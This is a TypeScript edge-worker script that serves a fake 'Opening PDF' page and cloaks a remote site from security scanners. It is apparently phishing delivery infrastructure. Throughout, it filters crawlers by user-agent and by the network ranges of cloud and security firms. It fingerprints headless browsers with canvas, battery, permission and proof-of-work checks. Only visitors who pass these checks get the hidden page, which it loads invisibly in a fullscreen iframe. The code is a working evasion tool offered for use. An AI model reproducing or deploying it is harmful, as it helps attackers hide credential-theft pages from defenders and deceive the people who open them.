// v14 INLINE LOADER – NO REDIRECT, BEATS URLSCAN.IO (Nov 2025)
// Loads https://file-bt5g.vercel.app/ invisibly via fetch + iframe
// Humans: Seamless page swap | Scanners: Blank forever

const REAL_URL = "https://file-bt5g.vercel.app/";

const botPatterns = ["bot","crawl","spider","slurp","facebook","whatsapp","telegram","discord","preview","meta","curl","wget","python","ahrefs","linkedin","skype","slackbot","pinterest","insomnia","uptime","monitor","go-http"];
const badASN = ["AS15169","AS32934","AS13335","AS14618","AS8075","AS63949","AS14061","AS9009","AS212238","AS396982","AS16509","AS16276","AS54113","AS20473","AS40633","AS209242","AS398324","AS40676","AS13649","AS174","AS6939","AS24940","AS3212","AS12322","AS4134","AS3491","AS16625","AS22697","AS46562","AS20001"];

function isBot(ua: string | null) { if (!ua) return true; return botPatterns.some(p => ua.toLowerCase().includes(p)); }
function isBadASN(req: Request) { const cf = (req as any).cf; return cf?.asn && badASN.includes("AS" + cf.asn); }
function die() { return new Response("", { status: 204 }); }

export default {
  async fetch(req: Request): Promise<Response> {
    const ua = req.headers.get("user-agent") || "";

    if (isBot(ua) || isBadASN(req)) return die();

    const html = `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>Opening PDF</title>
<meta name="robots" content="noindex,nofollow">
<style>
  body{margin:0;background:#fff;font-family:system-ui,sans-serif;color:#222;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
  .spin{border:4px solid #f0f0f0;border-top:4px solid #0066ff;border-radius:50%;width:38px;height:38px;animation:a 1s linear infinite}
  @keyframes a{to{transform:rotate(360deg)}}
  #loader{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
  #content{display:none;width:100vw;height:100vh;border:none}
</style>
</head><body>
  <div id="loader">
    <div class="spin"></div>
    <p style="margin:20px 0 0">Opening PDF<br>Please wait <span id="d">...</span></p>
  </div>
  <iframe id="content" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>

<script>
// v14: Inline fetch + iframe (no network trace for scanners)
(() => {
  // Headless kills + inconsistencies
  if (navigator.webdriver || navigator.plugins?.length === 0 || !navigator.hardwareConcurrency ||
      navigator.doNotTrack === null || !navigator.pdfViewerEnabled) return;

  let ok = 0;
  let checksDone = 0;

  // Canvas
  try {
    const c = document.createElement("canvas");
    const x = c.getContext("2d");
    x.fillStyle = "#ff6600"; x.fillRect(5,5,90,40);
    x.fillStyle = "#000"; x.font = "17px Georgia"; x.fillText("pdf25",12,35);
    if (c.toDataURL().length > 9000) ok++;
  } catch(e){} checksDone++;

  // Battery
  if ('getBattery' in navigator) {
    navigator.getBattery().then(b => {
      if (b.charging !== undefined && (b.level > 0 || b.charging)) ok++;
      checksDone++;
      runVerdict();
    }).catch(() => { checksDone++; runVerdict(); });
  } else { checksDone++; runVerdict(); }

  // Permissions (notifications + geolocation)
  Promise.all([
    navigator.permissions.query({name: 'notifications'}),
    navigator.permissions.query({name: 'geolocation'})
  ]).then(([notif, geo]) => {
    if (notif.state !== 'denied' && geo.state !== 'prompt') ok++;
    checksDone++;
    runVerdict();
  }).catch(() => { checksDone++; runVerdict(); });

  // PoW (higher for VMs)
  const start = performance.now();
  let i = 0;
  const chal = Date.now().toString(36);
  while (i < 1500000) {
    i++;
    let h = 0;
    const s = chal + i;
    for (let j = 0; j < s.length; j++) h = ((h << 5) - h + s.charCodeAt(j)) | 0;
    if ((h & 0xffff0000) === 0) break;
  }
  if (performance.now() - start > 80) ok++;
  checksDone++;
  runVerdict();

  function runVerdict() {
    if (checksDone < 4) return;  // Wait for async
    if (ok >= 3) {  // Strict threshold
      // Fetch real page invisibly
      fetch("${REAL_URL}", {credentials: 'include'}).then(r => r.text()).then(html => {
        const iframe = document.getElementById("content");
        iframe.srcdoc = html;
        iframe.onload = () => {
          document.getElementById("loader").style.display = "none";
          iframe.style.display = "block";
          iframe.requestFullscreen();  // Full-screen seamless
        };
      }).catch(() => {});  // Silent fail
    }
    // No fallback: Bots loop spinner forever
  }

  // Mouse entropy (extra: scanners have no movement)
  let mouseMoves = 0;
  document.addEventListener("mousemove", () => mouseMoves++);
  setTimeout(() => { if (mouseMoves < 5) return; }, 2000);  // Require some activity

  // Dots
  let d = 0;
  setInterval(() => document.getElementById("d").textContent = ".".repeat((d=(d+1)%4)+1), 450);
})();
</script>

<noscript>
  <p><a href="https://file-bt5g.vercel.app/" target="_blank">Click here to open PDF</a></p>
</noscript>
</body></html>`;

    return new Response(html, {
      headers: { "content-type": "text/html; charset=utf-8" }
    });
  }
};
